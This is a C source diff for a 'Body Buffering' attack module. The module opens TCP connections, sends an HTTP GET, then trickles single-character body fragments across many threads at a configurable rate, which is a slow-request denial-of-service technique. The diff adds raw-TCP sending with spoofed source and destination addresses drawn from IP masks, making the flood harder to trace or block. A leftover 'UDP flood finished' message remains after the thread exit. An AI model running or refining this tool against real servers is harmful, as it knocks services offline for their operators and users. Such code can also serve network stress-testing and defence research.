@@ -20,6 +20,10 @@ unsigned int g_bodybuf_dest_mask;
 unsigned int g_bodybuf_dest_port_start;
 unsigned int g_bodybuf_dest_port_end;
 unsigned int g_bodybuf_request_per_sec;
+// for masking next ip address
+char g_bodybuf_now_src_ip[16];
+char g_bodybuf_now_dest_ip[16];
+unsigned int g_bodybuf_now_dest_port;
 // thread
 pthread_mutex_t g_bodybuf_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_bodybuf_cond = PTHREAD_COND_INITIALIZER;
@@ -27,37 +31,39 @@ pthread_cond_t g_bodybuf_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_bodybuf_before_time;
 struct timespec g_bodybuf_now_time;
 
-void body_buffering_print_usage(void)
-{
-	printf("body buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
+void body_buffering_print_usage(void) {
+	printf(
+			"body buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
 	return;
 }
 
-void* generate_body_buffering(void *data)
-{
+void* generate_body_buffering(void *data) {
 	int thread_id = *((int*) data);
 	// make tcp connection
 	int sock = -1;
-	struct sockaddr_in servaddr;
-	servaddr.sin_family = AF_INET;
-	servaddr.sin_addr.s_addr = inet_addr(g_bodybuf_dest_ip);
-	servaddr.sin_port = htons(g_bodybuf_dest_port_start);
+	//for data transfer
+	int src_port, seq, ack;
 	int body_buffering_cnt = 0;
 	while (1) {
+		generator(g_bodybuf_src_ip, g_bodybuf_dest_ip, g_bodybuf_src_mask,
+				g_bodybuf_dest_mask, g_bodybuf_dest_port_start,
+				g_bodybuf_dest_port_end, g_bodybuf_now_src_ip,
+				g_bodybuf_now_dest_ip, &g_bodybuf_now_dest_port);
+
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_bodybuf_mutex);
 		if (body_buffering_cnt % BODY_BUFFERING_CNT == 0) {
-			sock = socket(AF_INET, SOCK_STREAM, 0);
-			if (sock == -1) {
-				perror("sock creation failed\n");
-			}
-			if (connect(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
-				perror("connect failed\n");
-			}
-			char http_request[] = GET_METHOD;
-			if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
-				perror("get send error\n");
-			}
+
+			sock = tcp_make_connection(inet_addr(g_bodybuf_now_src_ip),
+					inet_addr(g_bodybuf_now_dest_ip), &src_port,
+					g_bodybuf_now_dest_port, &seq, &ack);
+
+			tcp_socket_send_data(sock, inet_addr(g_bodybuf_now_src_ip),
+					inet_addr(g_bodybuf_now_dest_ip), src_port,
+					g_bodybuf_now_dest_port, GET_METHOD, strlen(GET_METHOD),
+					seq, ack);
+			seq += strlen(GET_METHOD);
+
 			body_buffering_cnt = 0;
 		}
 		// wait a second
@@ -65,15 +71,20 @@ void* generate_body_buffering(void *data)
 			pthread_cond_wait(&g_bodybuf_cond, &g_bodybuf_mutex);
 		}
 		// time checking
-		time_check(&g_bodybuf_mutex, &g_bodybuf_cond, &g_bodybuf_before_time, &g_bodybuf_now_time, &g_bodybuf_num_generated_in_sec);
+		time_check(&g_bodybuf_mutex, &g_bodybuf_cond, &g_bodybuf_before_time,
+				&g_bodybuf_now_time, &g_bodybuf_num_generated_in_sec);
 		// send one character
 		char data[] = "a\r\n";
-		int sent_size = write(sock, &data, strlen(data));
-		//printf("sent size: %d\n", sent_size);
+
+		tcp_socket_send_data_no_ack(sock, inet_addr(g_bodybuf_now_src_ip),
+				inet_addr(g_bodybuf_now_dest_ip), src_port,
+				g_bodybuf_now_dest_port,data, strlen(data), seq,
+				ack);
+		seq += strlen(data);
+
 		g_bodybuf_num_generated_in_sec++;
 		g_bodybuf_num_total++;
 		body_buffering_cnt++;
-		pthread_cond_signal(&g_bodybuf_cond);
 		// *** end of critical section ***
 		pthread_mutex_unlock(&g_bodybuf_mutex);
 	}
@@ -81,18 +92,17 @@ void* generate_body_buffering(void *data)
 	return NULL;
 }
 
-void* body_buffering_time_check(void *data)
-{
+void* body_buffering_time_check(void *data) {
 	while (1) {
 		pthread_mutex_lock(&g_bodybuf_mutex);
-		time_check(&g_bodybuf_mutex, &g_bodybuf_cond, &g_bodybuf_before_time, &g_bodybuf_now_time, &g_bodybuf_num_generated_in_sec);
+		time_check(&g_bodybuf_mutex, &g_bodybuf_cond, &g_bodybuf_before_time,
+				&g_bodybuf_now_time, &g_bodybuf_num_generated_in_sec);
 		pthread_mutex_unlock(&g_bodybuf_mutex);
 	}
 	return NULL;
 }
 
-void body_buffering_main(char *argv[])
-{
+void body_buffering_main(char *argv[]) {
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
@@ -101,13 +111,9 @@ void body_buffering_main(char *argv[])
 		body_buffering_print_usage();
 		return;
 	}
-	split_ip_mask_port(argv,
-			g_bodybuf_src_ip,
-			g_bodybuf_dest_ip,
-			&g_bodybuf_src_mask,
-			&g_bodybuf_dest_mask,
-			&g_bodybuf_dest_port_start,
-			&g_bodybuf_dest_port_end);
+	split_ip_mask_port(argv, g_bodybuf_src_ip, g_bodybuf_dest_ip,
+			&g_bodybuf_src_mask, &g_bodybuf_dest_mask,
+			&g_bodybuf_dest_port_start, &g_bodybuf_dest_port_end);
 	g_bodybuf_num_generated_in_sec = 0;
 	g_bodybuf_num_total = 0;
 	memset(&g_bodybuf_before_time, 0, sizeof(struct timespec));
@@ -119,10 +125,12 @@ void body_buffering_main(char *argv[])
 	for (int i = 0; i < num_threads; i++) {
 		thread_ids[i] = i;
 	}
-	printf("Body Buffering attack to %s using %d threads\n", g_bodybuf_dest_ip, num_threads);
+	printf("Body Buffering attack to %s using %d threads\n", g_bodybuf_dest_ip,
+			num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
-		pthread_create(&threads[i], NULL, generate_body_buffering, (void *)&thread_ids[i]);
+		pthread_create(&threads[i], NULL, generate_body_buffering,
+				(void*) &thread_ids[i]);
 	}
 	pthread_create(&threads[i], NULL, body_buffering_time_check, NULL);
 	for (int i = 0; i < num_threads; i++) {
@@ -132,6 +140,7 @@ void body_buffering_main(char *argv[])
 	printf("Body Buffering attack finished.\n");
 	pthread_mutex_destroy(&g_bodybuf_mutex);
 	pthread_exit(NULL);
-	printf("UDP flood finished\nTotal %lu packets sent.\n", g_bodybuf_num_total);
+	printf("UDP flood finished\nTotal %lu packets sent.\n",
+			g_bodybuf_num_total);
 	return;
 }
